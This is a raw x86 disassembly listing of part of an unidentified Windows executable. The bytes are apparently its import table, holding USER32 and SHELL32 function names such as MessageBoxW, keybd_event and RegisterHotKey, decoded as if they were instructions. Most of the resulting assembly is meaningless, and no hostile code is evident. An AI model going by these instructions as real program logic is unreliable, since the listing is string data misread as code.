  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fnsave [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x728bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],ch
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
